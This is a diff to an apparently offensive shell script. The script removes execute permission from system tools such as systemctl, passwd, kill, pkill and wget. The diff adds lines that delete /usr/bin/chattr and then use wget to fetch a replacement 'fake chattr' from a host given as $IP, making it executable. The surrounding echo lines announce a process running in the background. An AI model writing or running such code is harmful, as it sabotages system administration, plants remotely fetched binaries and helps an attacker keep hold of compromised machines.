@@ -53,10 +53,10 @@ echo "Files Operation Complete... Starting Operation 2..."
 echo 
 echo "-----------------------------------------------------------------------------"
 echo
+sudo rm -rf /usr/bin/chattr
 sudo chmod -x /usr/bin/systemctl
 sudo chmod -x /var
 sudo chmod -x /usr/bin/passwd
-sudo chmod -x /usr/bin/chattr
 sudo chmod -x /usr/bin/kill
 sudo chmod -x /usr/bin/killall
 sudo chmod -x /usr/bin/pkill
@@ -87,6 +87,10 @@ echo
 echo "--------------------File successfully running in the background---------------"
 echo "-----------------------------------------------------------------------------"
 echo
+cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
+echo
+echo "------------------Fake chattr successfully added-----------------"
+echo "-----------------------------------------------------------------"
 sudo chmod -x /bin/kill
 sudo chmod -x /bin/systemctl
 sudo chmod -x /usr/bin/wget
